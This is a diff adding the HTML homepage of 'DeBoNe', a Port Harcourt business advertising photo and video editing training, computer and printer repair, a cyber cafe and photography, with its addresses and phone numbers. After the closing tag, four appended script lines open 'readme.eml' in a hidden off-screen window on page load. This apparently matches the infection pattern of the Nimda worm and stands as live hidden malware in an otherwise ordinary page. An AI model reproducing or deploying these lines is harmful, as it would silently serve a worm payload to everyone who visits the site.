@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Debone Photos and Video Editing Studio</title>
+</head>
+<style type="text/css">
+*
+{
+    margin: 0;
+    padding: 0;
+    font-family: arial;
+    transition: 0.5s;
+
+}
+.container-fluid
+{
+    width: 100%;
+    height: 700px;
+}
+.container
+{
+    width: 1200px;
+    height: 50px;
+    margin: auto;
+    padding-top: 10px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+
+}
+.logo
+{
+    margin-left: 10px;
+    background-color: orange;
+}
+
+
+nav ul
+{
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    list-style: none;
+
+}
+nav ul li
+{
+    cursor: pointer;
+    color: #343f52;
+    font-size: 16px;
+    font-weight: bold;
+    margin-right: 40px;
+
+}
+nav ul li:hover
+{
+    color: #605dba;
+}
+.container .btn 
+{
+width: 150px;
+height: 45px;
+background: #f65298;
+border-radius:10px;
+border: 1px solid #f65298;
+color: #fff;
+font-weight: 400;
+font-size: 18px;
+cursor: pointer
+}
+.container .btn a
+{
+    text-decoration: none;
+    color: #fff;
+    transition: .3s ease;
+}
+.container .btn:hover
+{
+    border: 1px solid #f65298;
+    color: #f65298;
+    background: transparent;
+    font-weight: 400;
+}
+
+header
+{
+    width: 1200px;
+    height: 650px;
+    margin: auto;
+    display: flex;
+}
+header h1
+{
+    color: #354053;
+    font-size: 47px;
+    padding-top: 120px;
+    line-height: 60px;
+}
+header span
+{
+    color: #f65298;
+}
+header p
+{
+color: #747c8b;
+letter-spacing: 1px;
+margin-top: 20px;
+font-size: 20px;
+line-height: 30px;
+}
+header .btn 
+{
+width: 170px;
+height: 60px;
+background-image: linear-gradient(120deg, #f857a6 10%, #ef3f6e 100%);
+border-radius:10px;
+border: none;
+color: #fff;
+margin-top: 40px;
+font-weight: bold;
+font-size: 18px;
+cursor: pointer
+}
+.header .btn a
+{
+    text-decoration: none;
+    color: #fff;
+    transition: .3s ease;
+}
+header .btn:hover
+{
+   margin-top: 35px;
+}
+header .image img
+{
+    width: 450px;
+    margin-left: 150px;
+    margin-top: 100px;
+}
+.about-main
+{
+    width: 100%;
+    height: 700px;
+    padding-top: 100px;
+
+}
+.about
+{
+    width: 1200px;
+    height: 700px;
+    margin: auto;
+    display: flex;
+}
+.about .image img
+{
+    width: 470px;
+    margin-left: 100px;
+}
+.content
+{
+    margin-left: 100px;
+
+}
+.content h4
+{
+color: #f65298;
+font-size: 18px;
+}
+.content h2
+{
+    color: #354053;
+    font-size: 40px;
+    padding-top: 20px;
+    line-height: 45px;
+}
+.content p
+{
+    color: #747c8b;
+    letter-spacing: 1px;
+    margin-top: 20px;
+    font-size: 17px;
+    line-height: 30px;
+}
+.content .btn 
+{
+width: 170px;
+height: 60px;
+background-image: linear-gradient(120deg, #f857a6 10%, #ef3f6e 100%);
+border-radius:10px;
+border: none;
+color: #fff;
+margin-top: 40px;
+font-weight: bold;
+font-size: 18px;
+cursor: pointer
+}
+.content .btn a
+{
+    text-decoration: none;
+    color: #fff;
+    transition: .3s ease;
+}
+.content .btn:hover
+{
+   margin-top: 35px;
+}
+.content .image img
+{
+    width: 450px;
+    margin-left: 150px;
+    margin-top: 100px;
+}
+.contact-main
+{
+  width: 100%;
+  height: 700px;
+  padding-top: 150px;  
+}
+.contact
+{
+    width: 1200px;
+    height: 500px;
+    margin: auto;
+    display: flex;
+}
+.contact .image img
+{
+    width: 550px;
+    margin: 60px;
+}
+.content
+{
+    padding-left: 80px;
+}
+.content h4
+{
+    color: #f65298;
+    font-size: 18px;
+}
+.content h2
+{
+    color: #354053;
+    font-size: 40px;
+    padding-top: 20px;
+    line-height: 45px;
+}
+.content p
+{
+    color: #747c8b;
+    letter-spacing: 1px;
+    margin-top: 20px;
+    font-size: 17px;
+    line-height: 30px;
+}
+.content h3
+{
+    color: #354053;
+    margin-top: 25px;
+    font-size: 20px;
+}
+.content h5
+{
+    color: #747c8b;
+    font-size: 15px;
+    margin-top: 10px;
+}
+.design
+{
+    margin-left: 500px;
+    margin-top: 200px;
+    margin-bottom: 200;
+}
+.design footer
+{
+    color: #747c8b;
+}
+</style>
+
+<div class="container-fluid">
+<div class="container">
+    <img class="logo"  ><h1>DeBoNe</h1>
+    
+    <nav>
+        
+        <ul>
+            <li><a href="">Home</li>
+            <li><a href="video.html">Video</a></li>
+            <li><a href="terms and condition.html">Terms and Condition</a></li>
+            <li><a href="Privacy.htm">Privacy Policy</a></li>
+        </ul>
+    </nav>
+    <div>
+        <button class="btn"> <a href="contact.html">Contact Now</a></button>
+    </div>
+    </div>
+    <header>
+        <div class="content">
+            <h1>Quality <span>Products</span><br>for Everyone<br>Worldwide</h1>
+            <p>We're a company that focuses in offering<br>Quality product, goods and services to<br> people in any part of the world</p>
+            <button class="btn"><a href="contact.html"> Contact Now</a></button>
+        </div>
+        <div class="image">
+            <img src="images/100.jpg">
+        </div>
+    </header>
+    </div>
+</div>
+
+
+
+    <div class="about-main">
+        <div class="about">
+            <div class="image">
+            <img src="images/4.jpeg">
+        </div>
+        <div class="content">
+            <h4> PHOTO EDITING TRAINING</h4>
+            <h2>Photo Editing training<br> life in Port Harcourt</h2>
+            <p>Photoshop is arguably the most time-tested photo
+                 editing<br> software available. Photoshop allows 
+                 you to <br>edit, analyze, and arrange photos and 
+                 videos<br> using a robust toolkit of professional
+                 -quality<br> digital editing tools.<br></p>
+                     <button class="btn"><a href="contact.html"> Contact Now</a></button>
+        </div>
+    </div>
+    
+    <div class="about-main">
+        <div class="about">
+            <div class="image">
+            <img src="images/5.jpeg">
+        </div>
+        <div class="content">
+            <h4> PRINTER REPAIR</h4>
+            <h2> Printer repair training<br> going on in Port Harcourt</h2>
+            <p>We repair printer and give quality maintenance
+                 <br> to the printer. if your printer is spoilt contact 
+                  <br>debone now by click contact now and he will get
+                  <br>back to you. <br></p>
+                     <button class="btn"><a href="contact.html"> Contact Now</a></button>
+</div>
+</div>
+<div class="about-main">
+    <div class="about">
+        <div class="image">
+        <img src="images/17.jpeg">
+    </div>
+    <div class="content">
+        <h4> COMPUTER REPAIR</h4>
+        <h2>Computer repair training<br> going on in Port Harcourt</h2>
+        <p>we repair all kinds of computer system and we<br>
+            give quality maintenance to the computer system.<br>
+            if you have any spoit system contact debone now<br>
+            by clicking contact now.<br></p>
+                 <button class="btn"><a href="contact.html"> Contact Now</a></button>
+</div>
+</div>
+
+<div class="about-main">
+    <div class="about">
+        <div class="image">
+        <img src="images/15.jpeg">
+    </div>
+    <div class="content">
+        <h4> VIDEO EDITING TRAINING</h4>
+        <h2>Video Editing training<br> life in Port Harcourt</h2>
+        <p>Video Editing training going on in Port Harcourt<br>
+            and we expertize mainly on Pinnacle studio <br>
+            software which we use to teach our student, and<br>
+            and also Adobe Premier Pro<br></p>
+                 <button class="btn"><a href="contact.html"> Contact Now</a></button>
+</div>
+</div>
+<div class="about-main">
+    <div class="about">
+        <div class="image">
+        <img src="images/9.jpeg">
+    </div>
+    <div class="content">
+        <h4> COMPUTER ACCESSORIES STORE</h4>
+        <h2>Get the best quality<br> at cheap prices</h2>
+        <p>We are interested in offering Quality product to<br>
+            our customers at cheap prices. Click See more to <br>
+            view our product. <a href="">SEE MORE -></a><br>
+            </p>
+                 <button class="btn"><a href="contact.html"> Contact Now</a></button>
+</div>
+</div>
+
+<div class="about-main">
+    <div class="about">
+        <div class="image">
+        <img src="images/8.jpeg">
+    </div>
+    <div class="content">
+        <h4>COMPUTER TRAINING SCHOOL </h4>
+        <h2>Computer training<br> life in Port Harcourt</h2>
+        <p>We educate student on how to use the computer<br>
+            and Make them be computer professionals<br>
+            Anyone who graduate from our schoool usually<br>
+            get job easily, because we ensure that quality <br>
+            teaching is maintained 
+            <br></p>
+                 <button class="btn"><a href="contact.html"> Contact Now</a></button>
+</div>
+</div>
+
+<div class="about-main">
+    <div class="about">
+        <div class="image">
+        <img src="images/12.jpeg">
+    </div>
+    <div class="content">
+        <h4> CYBER CAFE</h4>
+        <h2>Business Center <br>  in Port Harcourt</h2>
+        <p>we expertize in Di printing, Flex Printing; Typing and <br>
+            Photocopy, Flyers, Paper bag, Internet Service, monogramy<br>
+            Posters, banners, Souvenir, Passport Photograph, Id card,<br>
+            Graphic Design, and so many more. for more inquiry, vist<br>
+            179 old refinery road, elelenwo, port harcourt, Rivers State,<br> 
+            Nigeria. or contact debone by clicking contact now.
+            <br></p>
+                 <button class="btn"><a href="contact.html"> Contact Now</a></button>
+</div>
+</div>
+
+<div class="about-main">
+    <div class="about">
+        <div class="image">
+        <img src="images/13.jpeg">
+    </div>
+    <div class="content">
+        <h4> PHOTOGRAPHY & VIDEOGRAPHY</h4>
+        <h2>Videography and Photography training<br> going on in Port Harcourt</h2>
+        <p>We cover so many event and we give the best to our<br>
+            customers, We cover Wedding, Birthday, Burial, Marriage,<br> 
+            Sport, Film/ movie and many more. Just Contact Debone <br>
+            you need a photographer or videographer<br></p>
+                 <button class="btn"><a href="contact.html"> Contact Now</a></button>
+</div>
+</div>
+
+<div class="contact-main">
+    <div class="contact">
+      <div class="image">
+          <img src="">
+      </div>
+      <div class="content">
+          <h4>CONTACT</h4>
+          <h2>Got any question?<br> Don't hesitate to get in touch</h2>
+          <h3>Head Office</h3>
+          <h5>179 Old Refinery Road Elelenwo, Port Harcourt Rivers State</h5>
+          <h3>Branch office</h3>
+          <h5>Umusukpu Playground, Igbo Etche, Rivers State</h5>
+          <h3>Phone</h3>
+          <h5>(+234) 08035988889, 08139763301, 08150861023</h5>
+          <h3>E-mail</h3>
+          <h5>bonechidi@gmail.com</h5>
+      </div>  
+    </div>
+    <div class="design">
+        <footer>@Design by Chris Dani</footer>
+    </div>
+</div>
+</body>
+</html>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
